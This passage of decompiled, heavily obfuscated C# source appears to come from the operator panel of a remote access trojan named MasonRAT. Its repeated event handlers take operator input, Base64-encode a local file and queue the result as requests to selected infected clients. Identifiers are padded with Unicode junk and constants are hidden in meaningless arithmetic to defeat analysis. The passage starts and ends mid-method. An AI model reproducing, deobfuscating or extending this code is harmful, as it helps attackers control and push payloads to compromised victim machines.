          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cټمــدـ\u060Dــــٽ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1907), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1908), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1909), (171914474 % 204032846 - 2033510890 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + ((-1744553089 ^ 1742456382 << 1611703078) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), ((-1410807332 ^ -984361439) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((-721831053 ^ -1704418939) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | (181682972 > 1993927891 ? -1907527027 : 1790580202) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1910) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1911))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1912))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cټـ̍\u0609\u060Aـ\u060Aـټۡــڠـ\u060Eؤـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1913), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1914), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1915), (-1320677164 ^ 438458532 << 973936849) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ((-147592861 - ~218195772 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> ((813573169 ^ (2016584479 | 732822902)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), (1115044851 - 7512991 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + -(1450874519 - 343342658 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1916) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1917))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1918))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ــٸٽـ\u0020ــ\u060Aـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1919), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1920), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1921), (868534048 - 930491018 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ ((1205625334 | 1415241312) - 551950893 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) % ((286774840 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), (385254090 - 385254095 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (0 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1922) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1923))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1924))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۛ̍ڙڛـٻـ\u0609ـد\u060Cـ\u060Bد\u060E(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1925), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1926), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1927), (588342397 - 587820619 % 824122741 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((2137209681 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> (1601870755 + (1119955778 >> 101410317) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (-843020853 - 429786019 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (181466772 - (1900658285 >> 2014357261) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | 1718489591 - 1087879651 % 595262908 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1928) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1929))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1930))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۡۛ\u060Fئڙ\u0608ٽ\u0020\u0609ء\u0608ـ\u060Eۨ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1931), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1932), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1933), (1006732015 - 89534833 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > (1170141088 > 1825666068 ? -1471937136 : 2117272620) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? 1821914286 - 1821914287 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 : 25278207 - (404451343 >> 512490468) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), (1772204365 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + -(1772204356 - (1506546502 << 46287519) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
